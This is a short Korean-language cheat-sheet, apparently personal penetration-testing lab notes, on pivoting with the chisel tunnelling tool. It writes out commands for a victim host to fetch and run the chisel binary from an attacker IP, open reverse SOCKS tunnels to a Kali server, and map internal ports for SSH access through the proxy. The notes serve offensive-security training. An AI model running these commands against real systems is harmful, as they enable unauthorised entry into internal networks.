※ windows exploit할 때는 1.7.7 을 사용, linux exploit을 할 때는 1.8.1 사용

**chisel 바이너리 다운 및 압축해제**
```jsx
wget <https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_linux_amd64.gz>
gunzip chisel_1.8.1_linux_amd64.gz
```

**(kali) chisel 서버 시작**
```jsx
chisel server --port 8080 --reverse
#...
#2023/10/03 18:13:54 server: session#2: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```

**chisel 예시1. (피해자) /tmp에 chisel 바이너리 다운 및 클라이언트 실행 - SOCKS 프록시 생성**
```jsx
wget 192.168.118.4/chisel -O /tmp/chisel && chmod +x /tmp/chisel
/tmp/chisel client 192.168.118.4:8080 R:socks
```

**ncat 사용하여 10.4.50.215 에 ssh 연결**
```jsx
sudo apt install ncat
ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' database_admin@10.4.50.215
```
**→ SOCKS5니깐 proxychains 사용 가능함(확인 완료)**

**Windows에서는 이렇게 하라고 되어있음**
```powershell
.\\chisel.exe client Kali_IP:8080 R:1080:socks
```

**chisel 예시2. (피해자) chisel 서버 80포트와 172.16.6.241:80을 매핑**
```jsx
chisel.exe client 192.168.119.5:8080 R:80:172.16.6.241:80
```

**127.0.0.1에 접속하면 내부망에 접속하는 것을 확인 가능**
![[Pasted image 20250714142221.png]]

**chisel reverse shell command:**
(win)
```powershell
chisel server -p 8888 --reverse
C:\\Windows\\Temp\\chisel.exe server --port 65000 --reverse
```

(kali)
```powershell
./chisel client 192.168.143.147:65000 R:80:127.0.0.1:1337
```